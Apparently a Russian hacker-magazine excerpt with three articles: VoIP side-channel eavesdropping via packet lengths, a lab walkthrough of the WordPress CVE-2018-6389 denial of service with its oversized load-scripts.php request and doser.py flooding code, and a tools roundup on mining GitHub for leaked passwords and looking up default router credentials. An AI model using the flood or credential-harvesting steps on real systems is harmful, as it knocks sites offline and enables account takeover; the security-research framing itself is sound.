VoIP‐телефония  постепенно  отвоевывает
позиции у традиционных медно‐про водных
телефонных сис тем, поскольку обеспечива‐
ет более высокую про пускную способность
при меньшей стоимости развертывания.           Антон Карев                                                                                    Эксперт по информационной
В 2013 году число VoIP‐абонентов сос‐       безопасности.высшее, специальностьОбразование
тавляло более 150 миллионов,  что уже      компьютерных«Защита информациисистемах»,в в
само по себе немало; а в 2017 году — поч‐      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
ти миллиард. Но  как насчет кон фиден‐      интересов — технологическая
                                                                                         разведка, аналитика в сфере
                                                                                      ИБ, искусственныйциальности VoIP‐переговоров? Спо собно
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ruли  сквозное шифрование, применяемое
в VoIP‐софте, обеспечить эту самую кон‐
фиденциальность?


Такие вопросы стали в особенности зло бодневными после откровений Сно‐
удена, рассказавшего миру о тотальной прослушке, которую правительствен‐
ные спецслужбы вроде АНБ (Агентство наци ональ ной безопасности) и ЦПС
(Центр правительственной связи) ведут при помощи шпионского софта
PRISM и BULLRUN — этому софту, как оказыва ется, под силу даже шиф‐
рованные переговоры.
   Каким же образом PRISM, BULLRUN и другой, им подобный софт извле‐
кает информацию из голосового потока, передаваемого по зашифрованным
каналам?
  Для того чтобы найти ответ на этот вопрос, нужно сначала разобраться,
как в VoIP передается голосовой трафик. Канал передачи данных в VoIP‐сис‐
темах, как правило, реализуется поверх UDP‐про токола и наиболее часто
работает по протоко лу SRTP (Secure Real‐time Transport Protocol — протокол
защищенной передачи данных в режиме реаль ного вре мени), который под‐
держивает упаковку (пос редством аудиокодеков) и шифрование аудиопо‐
тока. При этом шифрованный поток, который получается на выходе, имеет тот
же самый размер, что и входной аудиопоток. Как будет показано ниже,
подобные, казалось бы, незначительные утечки информации можно исполь‐
зовать для прослушивания «шифрованных» VoIP‐переговоров.


ЧТО ЗЛОУМЫШЛЕННИК МОЖЕТ ИЗВЛЕЧЬ ИЗ ЗАШИФРОВАННОГО
АУДИОПОТОКА
Большинство из тех аудиокодеков, которые применяются в VoIP‐системах,
основаны на CELP‐алго ритме (Code‐Excited Linear Prediction — кодовое
линейное предсказание), функциональные бло ки которого представлены
на рисунке ниже. Чтобы добиться более высоко го качества звука без уве‐
личения нагрузки на канал переда чи данных, VoIP‐софт обычно использует
аудиокодеки в VBR‐режиме (Variable bit‐rate — аудиопоток с переменным
битрейтом). По такому принципу работа ет, например, аудиокодек Speex.





              Функциональные бло ки алгоритма CELP

К чему это приводит в плане конфиденциальности? Простой пример. Speex,
работая в VBR‐режиме, упа ковывает шипящие согласные меньшим битрей‐
том, чем гласные, и более того — даже определенные глас ные и согласные
звуки упаковывает специфичес ким для них битрейтом. График на рисунке
ниже показывает распределение длин пакетов для фразы, в которой есть
шипящие согласные: Speed skaters sprint to the ﬁnish. Глубокие впадины гра‐
фика приходятся именно на шипящие фрагменты этой фразы. На рисунке
представ лена (источник) динамика входного аудиопотока, битрейта и раз‐
мера выходных (зашифрованных) пакетов, наложенная на общую шкалу вре‐
мени; поразительное сходс тво второго и треть его графиков можно видеть
невооруженным взглядом.





              Как шипящие зву ки влияют на размер пакетов

Плюс, если на рисунок посмотреть через призму математичес кого аппарата
цифровой обработки сигналов (который исполь зуется в задачах распозна‐
вания речи), вроде PHMM‐авто мата (Proﬁle Hidden Markov Models — рас‐
ширенный вариант скрытой марковской модели), то можно будет увидеть
намного больше, чем просто отличие гласных звуков от согласных. В том чис‐
ле идентифицировать пол, воз раст, язык и эмоции говорящего.


АТАКА НА VOIP ПО ОБХОДНЫМ КАНАЛАМ
PHMM‐автомат очень хорошо справляется с обработкой числовых цепочек,
с их сравнением между собой и нахождением закономерностей между ними.
Именно поэтому PHMM‐авто мат широко исполь зуется в решении задач рас‐
познавания речи.
  Кроме того, PHMM‐автомат ока зывается полезным и для прослушивания
зашифрованного аудиопотока. Но не напрямую, а по обходным каналам.
Иначе говоря, PHMM‐авто мат не может пря мо ответить на вопрос: «Какая
фраза содержится в этой цепочке шифрованных аудиопакетов?», но может
с большой точностью ответить на вопрос: «Содержится ли такая‐то фраза
в таком‐то месте такого‐то зашифрованного аудиопо тока?»
   Таким образом, PHMM‐автомат может рас позна вать только те фразы,
на которые его изначаль но натренировали. Одна ко современные технологии
глубокого обучения нас только могущественны, что способны натренировать
PHMM‐автомат до такой степени, что для него фактически стирается грань
между двумя озвученными чуть выше вопросами. Чтобы оце нить всю мощь
данного подхода, нужно слегка пог рузиться в матчасть.


НЕСКОЛЬКО СЛОВ О DTW-АЛГОРИТМЕ
DTW‐алгоритм (Dynamic Time Warping — динами чес кая трансформация вре‐
менной шкалы) до недавнего времени широко использовался при решении
задач идентификации говоря щего и распознавания речи. Он способен
находить сходства между двумя числовыми цепочками, сгенери рованными
по одному и тому же закону, — даже когда эти цепочки генерируются с раз‐
ной скоростью и располагаются в разных мес тах шкалы времени. Это именно
то, что происходит при оцифровке аудиопотока. Например, говорящий может
произнести одну и ту же фразу с одним и тем же акцентом, но при этом быс‐
трее или медленнее, с раз ным фоновым шумом. Это не помешает DTW‐алго‐
ритму найти сходства между первым и вторым вариантом. Чтобы проиллюс‐
трировать на примере, рас смотрим две целочис ленные цепочки:


0 0 0 4 7 14 26 23 8 3 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 5 6 13 25 24 9 4 2 0 0 0 0 0

Если сравнивать эти две цепочки «в лоб», то они, очевидно, сильно отличают‐
ся друг от друга. Однако если мы сравним их характерис тики, то увидим, что
цепочки определенно имеют некоторое сходство: обе они состоят из восьми
целых чисел, обе имеют схожее пиковое зна чение (25–26). «Лобовое» срав‐
нение, начинающееся от их точек вхо да, игнорирует эти важные характерис‐
тики. Но DTW‐алго ритм, сравнивая две цепочки, учитывает их и другие
показатели. Однако мы не будем силь но акцентироваться на DTW‐алгоритме,
поскольку на сегодняшний день есть более эффективная альтернатива —
PHMM‐автоматы.
  Экспериментально было уста новлено, что PHMM‐автоматы «опознают»
фразы из зашифрованного аудиопотока с 90%‐й точностью, тогда как DTW‐
алгоритм дает только 80%‐ю гарантию. Поэтому DTW‐алгоритм (который
в годы своего расцвета был популярным инс трументом в решении задач рас‐
познавания речи) упомина ем лишь для того, чтобы показать, насколько лучше
в сравнении с ним PHMM‐автоматы (в частнос ти, при рас познавании шиф‐
рованного аудиопотока). Конечно, DTW‐алгоритм обучается значительно
быстрее, чем PHMM‐автоматы. Это его преимущес тво неоспоримо. Однако
при современных вычислительных мощностях оно не будет принципиальным.


ПРИНЦИП ДЕЙСТВИЯ HMM-АВТОМАТОВ
HMM (просто HMM, а не PHMM) представляет собой инструмент статис‐
тического моделирования, который генерирует числовые цепочки, следуя
системе,  заданной  детерминированным  конечным  автоматом,  каждая
из переходных функций которого представляет собой так называемый мар‐
ковский процесс. Работа это го автомата всегда начинается с состояния B
(begin) и заканчивается сос тоянием E (end). Выбор очередного состояния,
в которое будет выполнен переход из текущего, делается в соответствии
с переходной функцией текущего состояния. По мере прод вижения между
состояниями HMM‐авто мат на каждом шаге выдает по одному чис лу,
из которых формируется выходная цепочка чисел. Когда HMM‐автомат ока‐
зывается в состоянии E, формирование цепочки заканчивается.
  При помощи HMM‐автомата можно находить закономерности в цепочках,
которые внешне выглядят случайными. Например, здесь это достоинс тво
HMM‐автомата исполь зует ся для нахождения закономерности между цепоч‐
кой длин пакетов и целевой фра зой, наличие которой мы проверяем
в зашифрованном VoIP‐потоке.





                     Пример HMM‐автомата

Хотя существует большое количес тво воз можных путей, по которым HMM‐
автомат может прой ти из точки B в точку E (в нашем случае при упаковке
отдельно взятого аудиофрагмента), все же для каж дого конкретного примера
(даже для такого случайного, как марковский процесс) есть один‐единствен‐
ный луч ший путь, одна‐единс твенная лучшая цепочка. Она же будет
и наиболее вероятной претенденткой, которую, скорее всего, выберет ауди‐
окодек при упаковке соответствующего ауди офрагмента (ведь ее уникаль‐
ность выражается в том числе и в том, что она лучше других поддается упа‐
ковке). Такие «лучшие цепочки» могут быть найдены при помощи ал горитма
Витерби (как это, например, сделано здесь).
  Кроме того, в задачах распозна вания речи (в том числе из зашифрован‐
ного потока данных, как в нашем случае) также полезно уметь вычислять, нас‐
колько вероятно, что выб ранная нами цепочка будет сгенери рована HMM‐
автоматом. Лаконичное решение данной задачи при ведено здесь; оно опи‐
рается на алгоритм «вперед‐назад» и алгоритм Баума — Вел ша.
   Вот здесь на основе HMM‐авто мата раз работан метод идентификации
языка, на котором идет раз говор, с точностью в 66%. Но такая низкая точ‐
ность не очень впечатляет, поэто му есть более продвинутая модификация
HMM‐автомата — PHMM, которая вытягивает из шифрованного аудиопотока
намного больше законо мерностей. Например, вот здесь подробно описано,
как при помощи PHMM‐авто мата идентифици ровать в зашифрованном тра‐
фике слова и фразы (а эта задача будет посложнее, чем прос то идентифика‐
ция языка, на котором идет разговор) с точностью до 90%.


ПРИНЦИП ДЕЙСТВИЯ PHMM-АВТОМАТОВ
PHMM — это усо вершенс твованная модификация HMM‐автомата, в которой,
помимо состояний «соот ветствия» (квадраты с буквой M), также присутствуют
состояния «вставки» (ромбы с буквой I) и «удаления» (круги с буквой D). Бла‐
годаря этим двум новым состояниям PHMM‐автоматы, в отличие HMM‐авто‐
матов, способны распознать гипотетическую цепочку A‐B‐C‐D, даже если она
присутствует не пол ностью (нап ример, A‐B‐D) или в нее произведена вставка
(например, A‐B‐X‐C‐D). В решении задачи распознавания зашифрованного
аудиопотока эти два нововведения PHMM‐автомата в особенности полезны.
Потому что выходные данные аудиокодека редко совпадают, даже когда
аудиовходы очень похожи (когда, например, один и тот же человек произно‐
сит одну и ту же фразу). Таким образом, простейшая модель PHMM‐автомата
состоит из трех взаимосвязанных цепочек состояний («соответствия», «встав‐
ки» и «удаления»), которые описывают ожидаемые длины сетевых пакетов
в каждой позиции цепочки (зашифрованных пакетов VoIP‐трафика для выб‐
ранной фразы).





                    Пример PHMM‐автомата

Однако,  поскольку  в  зашифрованном  аудиопотоке  сетевые  пакеты,
по которым расфасована целевая фраза, как пра вило, окру жены другими
сетевыми  пакетами  (остальной  частью  раз говора),  нам  потребуется
еще более продвинутый PHMM‐авто мат. Такой, который сможет изолировать
целевую фразу от других, окружающих ее звуков. Вот здесь для этого
к исходному PHMM‐автомату добавляют пять новых состояний. Наиболее
важное из этих добавленных пяти сос тояний — «слу чайное» (ромб со словом
Random). PHMM‐автомат (пос ле завершения ста дии обучения) переходит
в это состояние, когда к нему на вход попадают те пакеты, которые не явля‐
ются частью интересующей нас фразы. Состояния PS (Proﬁle Start) и PE (Pro‐
ﬁle End) обеспечивают переход между случай ным состоянием и профильной
частью модели. Такая улучшенная модификация PHMM‐автомата способна
распознавать даже те фразы, которых автомат «не слы шал» на этапе обу‐
чения.





  PHMM‐автомат решает задачу рас позна вания шифрованного аудиопо‐
  тока


ОТ ТЕОРИИ К ПРАКТИКЕ: РАСПОЗНАВАНИЕ ЯЗЫКА, НА КОТОРОМ
ИДЕТ РАЗГОВОР
Вот здесь представлена экспериментальная уста новка на основе PHMM‐
автомата, при помощи которой были проанализирова ны шифрованные ауди‐
опотоки с речью 2000 носителей языка из 20 разных язы ковых групп. После
завершения тренировочного про цес са PHMM‐автомат идентифици ровал
язык разговора с точностью от 60 до 90%: для 14 из 20 языков точность иден‐
тификации превысила 90%, для остальных — 60%.
  Экспериментальная установка, представленная на рисунке ниже, включает
в себя два ПК под управлением Linux с опенсорсным софтом VoIP. Одна
из машин работает как сервер и слушает в сети SIP‐вызовы. После получения
вызова сервер автоматичес ки отвечает абоненту, инициализируя речевой
канал в режим Speex over RTP. Здесь следует упомянуть, что канал управле‐
ния в VoIP‐системах, как пра вило, реали зует ся поверх TCP‐протокола и либо
работает по какому‐то из общедоступных про токолов с откры той архитек‐
турой (SIP, XMPP, H.323), либо имеет закрытую архитектуру, специфичную
для конкретного приложения (как в Skype, например).





      Экспе риментальная установка для работы с PHMM‐автоматом

Когда речевой канал инициализирован, сервер вос производит файл вызыва‐
ющему абоненту, а затем завершает SIP‐соеди нение. Абонент, который явля‐
ется еще одной машиной в нашей локальной сети, делает SIP‐вызов серверу
и затем при помощи сниффера «слушает» файл, который проигры вается сер‐
вером: прослушивает цепочку сетевых пакетов с шифрованным ауди отра‐
фиком, поступающих от сервера. Далее абонент либо трениру ет PHMM‐авто‐
мат на идентификацию языка раз говора (исполь зуя описанный в предыдущих
разделах математический аппа рат), либо «спрашивает» у PHMM‐автомата,
на каком языке идет раз говор. Как уже упоминалось, данная эксперименталь‐
ная установка обеспечивает точность идентификации языка до 90%.


ПРОСЛУШИВАНИЕ ШИФРОВАННОГО АУДИОПОТОКА SKYPE
Здесь продемонстрировано,  как при помощи PHMM‐автомата решать
еще более сложную задачу: рас познавать шифрованный аудиопоток, генери‐
руемый программой Skype  (которая исполь зует аудиокодек Opus/NGC
в VBR‐режиме и 256‐битное AES‐шифрование). В этой разработке исполь‐
зуется эксперименталь ная уста новка вроде той, что представлена на рисунке
выше, но только со Skype’овским кодеком Opus.
  Для обучения своего PHMM‐автомата исследователи воспользовались
такой последовательностью шагов:
 1. Сначала собрали набор саундтреков, включающих все интересующие их
  фразы.
 2. Затем установили сниф фер сетевых пакетов и инициировали голосовую
   беседу между двумя учет ными записями Skype (это привело к генерации
  шифрованного UDP‐трафика между двумя машина ми, в режиме P2P).
 3. Затем проигрывали каж дый из соб ранных саундтреков в Skype‐сеансе,
   используя медиаплеер, с пятисекундны ми интервалами мол чания между
   треками.
 4. Тем временем пакетный сниффер был нас троен для регис трации всего
   трафика, поступающего на вторую машину экспериментальной установки.

После сбора всех тренировочных данных цепочки длин UDP‐пакетов были
извлечены  при  помощи  автоматического  парсера  для  PCAP‐файлов.
Полученные цепоч ки, сос тоящие из длин пакетов полезной нагрузки, затем
использовались для тренировки PHMM‐модели с использованием алгоритма
Баума — Велша.


А ЕСЛИ ОТКЛЮЧИТЬ VBR-РЕЖИМ?
Казалось бы, проб лему подобных утечек можно решить, переведя аудиоко‐
деки в режим постоянного битрейта (хотя какое же это решение — пропус‐
кная способность от этого рез ко снижает ся), но даже в этом случае безопас‐
ность шифрованного аудиопотока все еще оставля ет желать лучшего. Ведь
эксплуатация длин пакетов VBR‐тра фика — это лишь один из примеров атаки
по обходным каналам. Но есть и дру гие примеры атак, например отслежива‐
ние пауз между словами.
  Задача, конеч но, нетривиальная, но вполне решаемая. Почему нетриви‐
альная? Потому что в Skype, например в целях согласования работы UDP‐
протокола и NAT (network address translation — преобразование сетевых
адресов), а также для повышения качества передаваемого голоса, передача
сетевых пакетов не оста навливается, даже когда в разговоре возникают
паузы. Это усложняет задачу выявления пауз в речи.
  Однако вот здесь раз работан алго ритм адап тивного порогового значения,
позволяющий отличать тишину от речи с точностью более 80%; предложен‐
ный метод основан на том факте, что речевая активность сильно коррелирует
с размером зашифрованных  пакетов: боль ше информации кодиру ется
в голосовом пакете, когда пользователь говорит, чем во вре мя молчания
пользователя. А вот здесь (с акцентом на Google Talk, Lella и Bettati) говоря‐
щий идентифицируется, даже когда через размер пакетов никакая утечка
не идет (даже когда VBR‐режим отключен). Здесь иссле дователи опираются
на измерение временных интервалов меж ду приемами пакетов. Описанный
метод опирается на фазы молчания, которые кодируются в более мелкие
пакеты, с более длинными временными интерва лами — чтобы отделять слова
друг от друга.


ЗАКЛЮЧЕНИЕ
Как показывает практика, даже самая современная криптография нес пособ‐
на защитить шифрованные VoIP‐коммуника ции от прослушивания, в том чис‐
ле если эта криптография реализова на надлежащим образом — что уже само
по себе маловероятно. Сто ит также отметить, что в данной статье подробно
разобрана лишь одна матема тичес кая модель цифровой обработки сигналов
(PHMM‐автоматы), которая ока зывается полез ной при распознавании шиф‐
рованного аудиопотока (в таком шпионском софте правительственных спец‐
служб, как PRISM и BULLRUN). Но таких матема тичес ких моделей существу ют
десятки и сотни. Так что если хочешь идти в ногу со временем — смотри
на мир сквозь призму высшей матема тики.


             INFO

                    Не забывай о критическом мышлении. Поп робуй
                       поговорить с голосовым вводом Google, но не
                         старайся произносить фразы медленно и понят‐
                          но. Говори как обычно. Включи авто матические
                       субтитры в Youtube. Как тебе нравится качество
                       распознавания исходно ничем не измененной
                        голосовой  информации?   :)  Логичный  вывод:
                       со всеми перечисленными алгоритмами в пла не
                       распознавания речи все значительно хуже.
ВЗЛОМ





                                                                                        aLLy
                                                                                    ONsec
                                                                                                 @iamsecurity
ПРЕССУЕМ
WORDPRESS

           КАК РАБОТАЕТ НОВЫЙ МЕТОД
        «КЛАСТЬ» САЙТЫ НА WORDPRESS




В WordPress, самой популярной CMS в мире, была найдена
ошибка, которая позволяет вызывать отказ в обслуживании
сайта, то есть DoS. Успешную эксплуатацию с легкостью
возможно провести удаленно, и для это го не нуж но обладать
никакими правами в системе.


Брешь была обнаружена изра иль ским ресерчером Бараком Тавили (Barak
Tawily aka Quitten), когда он изу чал очередной про ект на WordPress. Уяз‐
вимость получила идентификатор CVE‐2018‐6389 и присутствует на тысячах
сайтов по всему миру, так как разработ чики из WordPress Foundation не спе‐
шат признавать серьезность проблемы и исправлять ее. В результате от бага
не избавлены даже самые свежие на момент написания статьи версии
CMS — 4.9.5.
   Итак, предлагаю посмотреть на уяз вимость поближе, а там ты уже сам
решишь, насколько страшен черт.


СТЕНД
Я уже неоднократно поднимал стенд для тес тирования уязвимостей в Word‐
Press, чтобы написать об очередной уяз вимости, поэтому быстренько про‐
бегусь по основным аспектам, не сильно вда ваясь в подробности.
  По традиции исполь зуем контейнер Docker на Debian и седьмую версию
PHP с Apache.


$ docker run ‐it ‐‐rm ‐p80:80 ‐‐name=wpdos ‐‐hostname=wpdos debian /
bin/bash
$ apt‐get update && apt‐get install ‐y mysql‐server apache2 php php7.
0‐mysqli nano wget

Скачиваем и распаковываем WordPress версии 4.9.5:


$ cd /tmp && wget https://wordpress.org/wordpress‐4.9.5.tar.gz
$ tar xzf wordpress‐4.9.5.tar.gz
$ rm ‐rf /var/www/html/* && mv wordpress/* /var/www/html/
$ chown ‐R www‐data:www‐data /var/www/html/

Запускаем необходимые сервисы:


$ service mysql start && service apache2 start
$ mysql ‐u root ‐e "CREATE DATABASE wpdos; GRANT ALL PRIVILEGES ON *.
* TO 'root'@'localhost' IDENTIFIED BY 'megapass';"

Дальше дело за установкой CMS через браузер.





                        Ус тановка WordPress


ДЕТАЛИ УЯЗВИМОСТИ
Итак, Тавили во время прос мотра очередного сай та на WordPress обратил
внимание на скрипт load‐scripts.php. Он используется для отображения
JavaScript. Названия заг ружа емых файлов ука зываются в параметре load,
и при выводе их содержимое объединяется. Сделано это для того, чтобы
ускорить загрузку страницы и умень шить количество запросов к серверу.
   Таким образом, чтобы браузер получил все нужные для корректного отоб‐
ражения файлы JS, дос таточно сделать запрос на один скрипт load‐
scripts.php, в парамет рах которого будут перечислены все необходимые
файлы JavaScript. Это, кстати, довольно распространенная практика при раз‐
работке бэкенда. Та же логика у скрипта load‐styles.php, только в отно‐
шении файлов CSS.
  Посмотрим на исходный код load‐scripts.php. Названия файлов ука‐
зываются через запятую.


/wp-admin/load-scripts.php
17: $load = $_GET['load'];
18: if ( is_array( $load ) )
19:     $load = implode( '', $load );
20:
21: $load = preg_replace( '/[^a‐z0‐9,_‐]+/i', '', $load );
22: $load = array_unique( explode( ',', $load ) );

Какие же скрипты мы можем загрузить? Разумеется, произвольный файл про‐
читать не получится, существует четко прописанный список разрешенных
объектов.


/wp-admin/load-scripts.php
48: foreach ( $load as $handle ) {
49:     if ( !array_key_exists($handle, $wp_scripts‐>registered) )
50:         continue;
51:
52:     $path = ABSPATH . $wp_scripts‐>registered[$handle]‐>src;
53:     $out .= get_file($path) . "\n";
54: }

Этот список находится в свойстве registered класса WP_Scripts и запол‐
няется при помощи функции wp_default_scripts из файла script‐loader.
php.


/wp-admin/load-scripts.php
36: $wp_scripts = new WP_Scripts();
37: wp_default_scripts($wp_scripts);


/wp-includes/script-loader.php
37: /**
38:  * Register all WordPress scripts.
...
46:  * @param WP_Scripts $scripts WP_Scripts object.
47:  */
48: function wp_default_scripts( &$scripts ) {

Пополняется список разрешенных к заг рузке файлов при помощи метода
add.


/wp-includes/script-loader.php
048: function wp_default_scripts( &$scripts ) {
...
086:    $scripts‐>add( 'wp‐a11y', "/wp‐includes/js/wp‐a11y$suffix.js"
, array( 'jquery' ), false, 1 );
087:
088:    $scripts‐>add( 'sack', "/wp‐includes/js/tw‐sack$suffix.js",
array(), '1.6.1', 1 );
...
125:    $scripts‐>add( 'editor', "/wp‐admin/js/editor$suffix.js",
array('utils','jquery'), false, 1 );
...

В параметрах вызова ука зываются название элемента, путь до файла,
зависимости от других элементов, версия и про чее.


/wp-includes/class.wp-scripts.php
18: class WP_Scripts extends WP_Dependencies {


/wp-includes/class.wp-dependencies.php
206:    public function add( $handle, $src, $deps = array(), $ver =
false, $args = null ) {
207:        if ( isset($this‐>registered[$handle]) )
208:            return false;
209:        $this‐>registered[$handle] = new _WP_Dependency( $handle,
 $src, $deps, $ver, $args );
210:        return true;
211:    }

Полный список всех вызовов загружаемых элементов можно найти тут. Всего
их 181. По умолчанию загружа ются минифицированные версии скриптов.


/wp-includes/script-loader.php
67:     $suffix = SCRIPT_DEBUG ? '' : '.min';
68:     $dev_suffix = $develop_src ? '' : '.min';





        Вызов загрузки скрипта utils.min.js через load‐scripts.php

Идея в том, чтобы прочитать все возможные JS‐фай лы одним запросом. Он
получается монструозным, не буду приводить его целиком, но вмес то мно‐
готочия в конце дол жно идти еще 170 названий фай лов.


http://wpdos.visualhack/wp‐admin/load‐scripts.php?load=utils,common,
wp‐a11y,sack,quicktags,colorpicker,editor,wp‐fullscreen‐stub,wp‐ajax‐
response,wp‐api‐request,wp‐pointer...

Время, прошедшее от отправления запроса до первого полученного байта
ответа, равно ~500 миллисекунд. Пример но столь ко сервер обрабаты вал
этот запрос.





   Загрузка всех JS‐файлов одновременно через запрос к load‐scripts.php

Каждый файл читается отдельно при помощи file_get_contents.


/wp-admin/includes/noop.php
102: function get_file( $path ) {
103:
104:    if ( function_exists('realpath') ) {
105:        $path = realpath( $path );
106:    }
107:
108:    if ( ! $path || ! @is_file( $path ) ) {
109:        return '';
110:    }
111:
112:    return @file_get_contents( $path );
113: }

Получается, что каждый запрос будет вызывать 181 операцию ввода‐вывода,
и если таких запросов будет много, то в скором времени у сервера могут
начаться проблемы. Особенно это каса ется сайтов на shared‐хостингах.


АВТОМАТИЗИРУЙ ЭТО
Теперь давай организуем множес твенные запросы к такому URL. Тавили
для этих целей исполь зовал самопис ную утилиту под наз ванием doser,
которая выполняет запросы к серверу в ука занное количество потоков. Сам
скрипт  написан  на  Python  2.7  с  использованием библиотек  requests
и threading.
  Процедура вызова проста:


$ python doser.py ‐g <url> ‐t 999

Ключ g говорит нам, что нужно отправлять запросы методом GET, а с
помощью t можно указать количес тво потоков.


doser.py
067: def sendGET(url):
...
070:    try:
071:        request_counter+=1
072:        request = requests.get(url, headers=headers)
...
094:            while True:
095:                global url
096:                sendGET(url)
...
113: def main(argv):
...
115:    parser.add_argument('‐g', help='Specify GET request. Usage:
‐g \'<url>\'')
...
119:    parser.add_argument('‐t', help='Specify number of threads to
be used', default=500, type=int)
...
128:        for i in range(args.t):
129:            t = SendGETThread()

Возможно, решение не самое быстрое и оптималь ное, но скрипт работает
добросовестно и с задачей справляет ся. Пос ле двух тысяч запросов наш
простенький сервер уже недос тупен для обычного пользователя.





                   Успешно проведенная DoS‐атака

Чтобы добавить еще немного нагрузки, можешь дополнительно отправлять
запросы на загрузку файлов CSS через load‐styles.php.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Вот такой нестандартный вектор ата ки. Конечно, импакт от его исполь‐
зования не слишком серьезный, иначе мы бы уже наблюдали массовый
«падёж». Правильно настро енный выделен ный сервер от такого трюка пос‐
традать не должен. А вот на shared‐хос тингах стоят лимиты на потребляемые
ресурсы, и, если они исчерпаются, могут воз никнуть проблемы. Так, во время
тестирования на одном из моих сайтов хостер зас памил мне почту сооб‐
щениями о пре вышении выделенных лимитов.
  Почему же в WordPress не считают это своей проблемой и не торопятся
исправлять? С одной стороны, разработчиков мож но понять: они не несут
ответственности за использование их CMS на сла бых или некорректно нас‐
троенных серверах (WordPress вообще‐то далеко не самая легкая CMS).
Но это совсем не  то, что хочется слышать от разработчиков системы,
на которой работает твой блог. Проблему все равно придется фиксить, и я
уверен, что есть масса безобидных способов сделать это. Да ей уже дали
CVE, в конце концов!
ВЗЛОМ
X-TOOLS

ПОДБОРКА ПОЛЕЗНЫХ
ХАКТУЛЗ ДЛЯ СБОРА
И АНАЛИЗА ДАННЫХ





     Илья Русанен
    Главный редактор ][,
 занимаюсь разработкой и
      безопасностью
       rusanen@glc.ru





Сегодняшний X‐Tools посвящен сбо ру и анализу открытых
данных. Другими словами — этапу рекона. Очередные семь
тулз, которые помогут найти, просканировать уязвимые хос‐
ты, а также облегчить этап эксплуата ции, обогащая ресер‐
чера новыми знаниями о целевой машине.


ИЩЕМ ИНТЕРЕСНЫЕ СТРОКИ В GIT-РЕПОЗИТОРИЯХ
 • Разработчик: Danilo Vaz aka UNK
 • Страница: GitHub

Боевые логины и пароли в Git‐репозитории — это уже притча во языцех и нас‐
тоящий security‐фольклор. Казалось бы, сегодня уже все знают, что чувстви‐
тельные данные дол жны быть как минимум заигнорены в .gitignore, но в
паблике регулярно всплывают креды и дру гие ценные строчки в открытом
виде. Причин масса: или репозиторий изначаль но был приватным, или вком‐
митили тестовые данные, забыли и перенес ли на продакшен — вся кое быва‐
ет. Ощутить весь масштаб тра гедии поможет интерес ная тулза — GitMiner.
   GitMiner — это поисковик по открытым репозиториям на GitHub. Ты ука‐
зываешь ему, что искать (логины, пароли), в каких файлах (наз вание, рас‐
ширение), что дол жно быть внут ри (чтобы исклю чить фал сы по максимуму),
а также правила для парсинга. И запус каешь поиск. В ответ тебе в удобном
виде будут сыпаться запрошенные данные, а также URL, где это безобразие
было обнаружено. Для работы понадобится авторизационная кука с Гитхаба,
которую можешь взять в Chrome Dev Tools.


➜ git_miner.py ‐q 'filename:wp‐config extension:php FTP_HOST in:
file ' ‐m wordpress ‐c <твоя_кука> ‐o result.txt

В ответ тебе будут приходить вот такие веселые картинки. И разумеется,
далеко не везде данные тес товые.





Кроме логинов и паролей, искать можно еще много чего. Загляни в config/
parsers.json. Там найдешь описание модулей — шаблонов для парсинга
в GitMiner. Если хочешь парсить что‐то иное, прос то добавь еще один узел
в JSON c нужными параметрами.


➜ cat config/parsers.json
{
  "wordpress":{
    "contains":"root",
    "parameters":{
      "param1":"'FTP_USER',",
      "param2":"'FTP_PASS',",
      "param3":"'FTP_HOST',",
      "param4":"'DB_USER',",
      "param5":"'DB_PASSWORD',"
    },
    "splitparam":"'",
    "splitorder":{
      "order1":"1",
      "order2":"3"
    }
  },
  "senhas":{
    "contains":"senha",
    "parameters":{
    ...

GitMiner отлично работа ет с третьим Питоном и минимумом зависимостей,
а значит, запустится в обычном virtualenv. Но на слу чай, если запускать чужой
код на хосте не хочется совсем, в репе ты найдешь еще и Dockerﬁle.


             INFO

                      Если тулза будет падать с TypeError: write() ar‐
                    gument must be str, not bytes, попробуй убрать
                       из 78‐й строки энкод в UTF‐8 (.encode("utf‐
                   8")): write() тут ждет str.



ВСПОМИНАЕМ ДЕФОЛТНЫЕ ПАРОЛИ РОУТЕРОВ
 • Разработчик: Viral Maniar
 • Страница: GitHub

Дефолтные пароли на сетевых устройствах встречаются чаще, чем может
показаться на первый взгляд. В интернете открытыми портами наружу торчат
сотни роутеров не только частных пользователей, но и корпоративных сетей.
Если, судя по фингерпринтам, ты набрел на такую железку, попробуй дефол‐
тные пароли — вдруг подойдет? А сами заводские креды поможет найти
Passhunt.





Passhunt — это простенький скрипт на Python, который поз воляет быстро
вывести дефолтные логины и пароли для наиболее популярных устройств:
как преимущественно консьюмерских типа  Zyxel, D‐Link, так и промыш‐
ленных — Cisco, Check Point и так далее. В базе тулзы 523 вендора, и она
действительно может выручить, когда ты в очередной раз соберешься писать
в Гугле mikrotik default login password.
  В доке к Passhunt ука зано, что она работает с Python 3.0+, однако в ее
зависимости ssl‐1.16 есть


➜ print 'looking for', f

что недвусмысленно говорит об обратном и валит pip при установке. Можно
долго мучать Python 2.6 (а она работает именно с ним!) для работы модуля
ssl, пока не поймешь, что раз работчик... прос то забыл удалить ssl из re‐
quirements.txt при переходе на третью ветку. Просто удали зависимость,
сделай pip install ‐r requirements.txt, и оно заработает.
  А вообще, сам Passhunt написан в «лучших» тра дициях хактулз, так что про‐
ще юзать curl ;). В конце концов, Passhunt — это просто обертка, которая пар‐
сит https://cirt.net/ с помощью BeautifulSoup.


СКАНИРУЕМ УЯЗВИМЫЕ СЕРВИСЫ
 • Разработчик: scip AG
 • Страница: GitHub

Nmap — это дефол тная тулза для всех, кто хоть как‐то относится к network se‐
curity. Возможности культового сканера, разумеется, не ограничиваются
простым сканированием портов.


        WWW

                      Если хочешь разобраться подробнее в теме, обя‐
                        зательно прочти материалы по трюкам с nmap
                      и NSE‐скриптингу.


А пока напомню, что Nmap зачас тую помога ет при сканировании отфингер‐
принтить версию используемого на хосте софта. А это, в свою оче редь,
поможет  узнать,  какие  уязвимости  потенциаль но  могут  обнаружиться
на исследуемой машине.





Проект vulscan — это NSE‐скрипт, который превратит твой Nmap в сканер
уязвимостей. В комплекте со скриптом идет нес колько баз уязвимостей.
Установка нехитра — просто кло нируй репу в /scripts (для Nmap из macOS,
например, это будет /usr/local/Cellar/nmap/7.60/share/nmap/scripts)
и запускай, передав в аргу менте NSE‐скрипт:


➜ nmap ‐sV ‐‐script=vulscan/vulscan.nse target.com

